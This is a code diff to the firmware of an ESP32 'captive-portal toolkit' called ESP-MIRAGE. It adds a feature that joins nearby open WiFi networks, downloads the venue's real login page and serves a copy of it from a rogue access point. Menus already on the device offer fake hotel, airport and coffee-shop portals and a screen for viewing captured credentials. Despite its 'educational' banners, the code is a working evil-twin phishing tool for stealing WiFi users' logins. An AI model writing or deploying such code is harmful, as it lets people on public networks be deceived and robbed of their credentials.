@@ -3,11 +3,13 @@
 #include "wifi_scanner.h"
 #include "websocket_server.h"
 #include "captive_portal.h"
+#include "portal_cloner.h"
 
 // Global objects
 WiFiScanner scanner;
 WSTerminalServer wsServer(WEBSOCKET_PORT);
 CaptivePortal portal;
+PortalCloner portalCloner;
 bool inSubMenu = false;
 enum SubMenuState {
     MENU_NONE,
@@ -76,7 +78,9 @@ void handleSerialInput();
 void handleCommand(String cmd);
 void scanMode();
 void captivePortalMode();
+void clonePortalMode();
 void viewCredentials();
+void viewClonedPortal();
 void setupControlAP();
 void setupLED();
 void blinkLED(int times, int delayMs);
@@ -151,26 +155,34 @@ void setupControlAP() {
     out.printf("║ SSID:          %-45s ║\n", CONTROL_AP_SSID);
     out.printf("║ Password:      %-45s ║\n", CONTROL_AP_PASSWORD);
     out.printf("║ IP Address:    %-45s ║\n", IP.toString().c_str());
-    out.printf("║ WebSocket:     ws://%-38s ║\n", (IP.toString() + ":" + String(WEBSOCKET_PORT)).c_str());
+    out.printf("║ WebSocket:     ws://%-38s   ║\n", (IP.toString() + ":" + String(WEBSOCKET_PORT)).c_str());
     out.println("╠══════════════════════════════════════════════════════════════╣");
     out.println("║ How to connect:                                              ║");
-    out.printf("║ 1. Connect to WiFi: %s                         ║\n", CONTROL_AP_SSID);
-    out.println("║ 2. Open the HTML terminal client in your browser            ║");
-    out.println("║ 3. Enter WebSocket URL and click Connect                    ║");
+    out.printf("║ 1. Connect to WiFi: %s                            ║\n", CONTROL_AP_SSID);
+    out.println("║ 2. Open the HTML terminal client in your browser             ║");
+    out.println("║ 3. Enter WebSocket URL and click Connect                     ║");
     out.println("╚══════════════════════════════════════════════════════════════╝\n");
 }
 
 void printBanner() {
     out.println("\n\n");
-    out.println("╔══════════════════════════════════════════════════════════════╗");
-    out.println("║                                                              ║");
-    out.println("║              ESP32 WiFi Security Research Tool               ║");
-    out.println("║                                                              ║");
-    out.println("║                    ⚠️  EDUCATIONAL USE ONLY ⚠️                ║");
-    out.println("║                                                              ║");
-    out.println("║   Only use on networks you own or have permission to test   ║");
-    out.println("║                                                              ║");
-    out.println("╚══════════════════════════════════════════════════════════════╝");
+    out.println("╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗");
+    out.println("║                                                                                                   ║");
+    out.println("║   ███████╗███████╗██████╗ ██████╗ ██████╗       ███╗   ███╗██╗██████╗  █████╗  ██████╗ ███████╗   ║");
+    out.println("║   ██╔════╝██╔════╝██╔══██╗╚════██╗╚════██╗      ████╗ ████║██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝   ║");
+    out.println("║   █████╗  ███████╗██████╔╝ █████╔╝ █████╔╝█████╗██╔████╔██║██║██████╔╝███████║██║  ███╗█████╗     ║");
+    out.println("║   ██╔══╝  ╚════██║██╔═══╝  ╚═══██╗██╔═══╝ ╚════╝██║╚██╔╝██║██║██╔══██╗██╔══██║██║   ██║██╔══╝     ║");
+    out.println("║   ███████╗███████║██║     ██████╔╝███████╗      ██║ ╚═╝ ██║██║██║  ██║██║  ██║╚██████╔╝███████╗   ║");
+    out.println("║   ╚══════╝╚══════╝╚═╝     ╚═════╝ ╚══════╝      ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ║");
+    out.println("║                                                                                                   ║");
+    out.println("║                                      ░ E S P - M I R A G E ░                                      ║");
+    out.println("║                          ESP32 Captive-Portal Toolkit — Research Only                             ║");
+    out.println("║                                                                                                   ║");
+    out.println("║                      ⚠️  EDUCATIONAL — DO NOT USE ON OTHERS' NETWORKS ⚠️                            ║");
+    out.println("║                                                                                                   ║");
+    out.println("║                          Author:./runme             •   Version: 0.1                              ║");
+    out.println("║                                                                                                   ║");
+    out.println("╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝");
     out.println("");
 }
 
@@ -180,13 +192,16 @@ void printMenu() {
     out.println("╠══════════════════════════════════════════════════════════════╣");
     out.println("║                                                              ║");
     out.println("║  [1] Scan WiFi Networks                                      ║");
-    out.println("║  [2] Start Captive Portal                                    ║");
-    out.println("║  [3] Stop Captive Portal                                     ║");
-    out.println("║  [4] View Captured Credentials                               ║");
-    out.println("║  [5] System Information                                      ║");
-    out.println("║  [6] Network Information                                     ║");
-    out.println("║  [7] Clear Captured Credentials                              ║");
+    out.println("║  [2] Clone Captive Portal                                    ║");
+    out.println("║  [3] View Cloned Portal Info                                 ║");
+    out.println("║  [4] Start Captive Portal                                    ║");
+    out.println("║  [5] Stop Captive Portal                                     ║");
+    out.println("║  [6] View Captured Credentials                               ║");
+    out.println("║  [7] System Information                                      ║");
+    out.println("║  [8] Network Information                                     ║");
+    out.println("║  [9] Clear Captured Credentials                              ║");
     out.println("║  [h] Help / Show Menu                                        ║");
+    out.println("║  [C] Clear Cloned Portal                                     ║");
     out.println("║  [0] Restart ESP32                                           ║");
     out.println("║                                                              ║");
     out.println("╚══════════════════════════════════════════════════════════════╝");
@@ -233,7 +248,41 @@ void handleCommand(String cmd) {
             printMenu();
             return;
         }
+        // --- New cloned portal option ---
+        if (typeChoice == '5') {
+            extern PortalCloner portalCloner;  // assuming global instance
+            out.println("\n[*] Initializing Cloned Captive Portal...");
 
+            if (!portalCloner.hasClonedPortal()) {
+                out.println("[-] No cloned portal found! Please clone a portal first.");
+            } else {
+                ClonedPortal cloned = portalCloner.getClonedPortal();
+                portal.useClonedPortal(cloned.html);
+
+                if (WiFi.getMode() != WIFI_AP) {
+                    WiFi.mode(WIFI_AP);
+                    WiFi.softAP("ESP32_Cloned_Portal");
+                    out.printf("[+] Access Point started: %s\n", WiFi.softAPIP().toString().c_str());
+                }
+
+                portal.begin("ESP32_Cloned_Portal");
+
+                out.println("\n╔══════════════════════════════════════════════════════════════╗");
+                out.println("║                 CLONED CAPTIVE PORTAL STARTED                ║");
+                out.println("╠══════════════════════════════════════════════════════════════╣");
+                out.printf ("║  Source SSID : %-45s ║\n", cloned.ssid.c_str());
+                out.printf ("║  Portal URL  : http://%-37s ║\n", WiFi.softAPIP().toString().c_str());
+                out.printf ("║  HTML Size   : %-45d ║\n", cloned.htmlSize);
+                out.println("╚══════════════════════════════════════════════════════════════╝");
+            }
+
+            subMenuState = MENU_NONE;
+            inSubMenu = false;
+            delay(1000);
+            printMenu();
+            return;
+        }
+        // --- Normal portal options ---
         switch (typeChoice) {
         case '1': portalType = PORTAL_GENERIC; break;
         case '2': portalType = PORTAL_HOTEL; break;
@@ -283,10 +332,18 @@ void handleCommand(String cmd) {
             break;
             
         case '2':
-            captivePortalMode();
+            clonePortalMode();
             break;
             
         case '3':
+            viewClonedPortal();
+            break;
+            
+        case '4':
+            captivePortalMode();
+            break;
+            
+        case '5':
             if (portal.isRunning()) {
                 portal.stop();
                 out.println("[*] Captive Portal stopped");
@@ -295,19 +352,19 @@ void handleCommand(String cmd) {
             }
             break;
             
-        case '4':
+        case '6':
             viewCredentials();
             break;
             
-        case '5':
+        case '7':
             printSystemInfo();
             break;
             
-        case '6':
+        case '8':
             printNetworkInfo();
             break;
             
-        case '7':
+        case '9':
             portal.clearCredentials();
             out.println("[*] All credentials cleared");
             break;
@@ -322,7 +379,18 @@ void handleCommand(String cmd) {
             delay(1000);
             ESP.restart();
             break;
-            
+
+        case 'c':
+        case 'C':
+            if (!portalCloner.hasClonedPortal()) {
+            out.println("[-] No cloned portal found. Run clonePortalMode() first.");
+            } else {
+                out.println("\n[*] Clearing cloned portal data...");
+                portalCloner.clearClonedPortal();
+                out.println("[+] Cloned portal data cleared successfully!");
+            }
+            break;
+    
         default:
             out.printf("[-] Invalid choice: '%s'\n", cmd.c_str());
             out.println("[*] Type 'h' for help");
@@ -335,6 +403,94 @@ void handleCommand(String cmd) {
     }
 }
 
+void clonePortalMode(){
+    Serial.println("\n╔══════════════════════════════════════════════╗");
+    Serial.println("║           PORTAL CLONER INITIALIZED          ║");
+    Serial.println("╚══════════════════════════════════════════════╝");
+
+    Serial.println("\n[1/4] Connecting to target network...");
+
+    // Step 1: Connect to open network automatically
+    int networkCount = WiFi.scanNetworks();
+    if (networkCount <= 0) {
+        Serial.println("[-] No WiFi networks found!");
+        return;
+    }
+
+    bool connected = false;
+    for (int i = 0; i < networkCount; i++) {
+        String ssid = WiFi.SSID(i);
+        int encryption = WiFi.encryptionType(i);
+
+        // Try open networks only
+        if (encryption == WIFI_AUTH_OPEN) {
+            Serial.printf("[*] Trying '%s'...\n", ssid.c_str());
+            if (portalCloner.connectToNetwork(ssid.c_str())) {
+                connected = true;
+                break;
+            }
+        }
+    }
+
+    if (!connected) {
+        Serial.println("[-] Failed to connect to any open network!");
+        return;
+    }
+
+    // Step 2: Detect captive portal
+    Serial.println("\n[2/4] Detecting captive portal...");
+    if (!portalCloner.detectCaptivePortal()) {
+        Serial.println("[-] No captive portal detected!");
+        portalCloner.disconnect();
+        return;
+    }
+
+    // Step 3: Download and process HTML
+    Serial.println("\n[3/4] Downloading portal HTML...");
+    if (!portalCloner.downloadPortal()) {
+        Serial.println("[-] Failed to clone portal HTML!");
+        portalCloner.disconnect();
+        return;
+    }
+
+    // Step 4: Disconnect cleanly
+    Serial.println("\n[4/4] Disconnecting from target...");
+    portalCloner.disconnect();
+
+    // Print summary
+    Serial.println("\n╔══════════════════════════════════════╗");
+    Serial.println("║  PORTAL CLONED SUCCESSFULLY!         ║");
+    Serial.println("╚══════════════════════════════════════╝");
+    Serial.println(portalCloner.getCloneInfo());
+
+}
+
+void viewClonedPortal(){
+        Serial.println("\n===== VIEW CLONED PORTAL =====");
+    if (!portalCloner.hasClonedPortal()) {
+        Serial.println("[-] No cloned portal found. Run clonePortalMode() first.");
+        return;
+    }
+
+    ClonedPortal cloned = portalCloner.getClonedPortal();
+
+    Serial.println(portalCloner.getCloneInfo());
+    Serial.printf("[*] Showing first 300 chars of HTML:\n\n");
+    Serial.println(cloned.html.substring(0, 300));
+    Serial.println("...\n");
+
+    // Optionally save to SPIFFS (if enabled)
+    /*
+    File f = SPIFFS.open("/portal.html", FILE_WRITE);
+    if (f) {
+        f.print(cloned.html);
+        f.close();
+        Serial.println("[+] Saved cloned HTML to /portal.html");
+    }
+    */
+
+}
+
 void captivePortalMode() {
     inSubMenu = true;
     subMenuState = MENU_PORTAL_SELECT;
@@ -345,13 +501,14 @@ void captivePortalMode() {
     }
 
     out.println("\n╔══════════════════════════════════════════════════════════════╗");
-    out.println("║                  SELECT CAPTIVE PORTAL TYPE                   ║");
+    out.println("║                  SELECT CAPTIVE PORTAL TYPE                  ║");
     out.println("╠══════════════════════════════════════════════════════════════╣");
     out.println("║                                                              ║");
     out.println("║  [1] Generic Wi-Fi Portal                                    ║");
     out.println("║  [2] Hotel Wi-Fi Portal                                      ║");
     out.println("║  [3] Airport Wi-Fi Portal                                    ║");
     out.println("║  [4] Coffee Shop Wi-Fi Portal                                ║");
+    out.println("║  [5] Serve Cloned Captive Portal                             ║");
     out.println("║  [b] Back to Main Menu                                       ║");
     out.println("║                                                              ║");
     out.println("╚══════════════════════════════════════════════════════════════╝");
